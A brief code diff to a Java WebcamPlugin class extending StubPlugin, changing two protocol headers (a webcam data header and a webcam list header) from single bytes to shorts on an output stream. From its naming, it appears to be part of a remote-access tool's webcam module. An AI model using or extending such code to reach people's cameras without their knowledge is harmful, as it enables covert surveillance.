@@ -62,7 +62,7 @@ public class WebcamPlugin extends StubPlugin {
 			Webcam cam = cams.get(webcam);		
 			
 			if (enabled) {
-				dos.writeByte(header);			
+				dos.writeShort(HEADER);			
 				
 				try {
 					if (!cam.isOpen()) {
@@ -108,7 +108,7 @@ public class WebcamPlugin extends StubPlugin {
 			try {
 				List<Webcam> webcams = Webcam.getWebcams();
 				
-				dos.writeByte(LIST_WEBCAM_HEADER);
+				dos.writeShort(LIST_WEBCAM_HEADER);
 
 				dos.writeInt(webcams.size());
 				
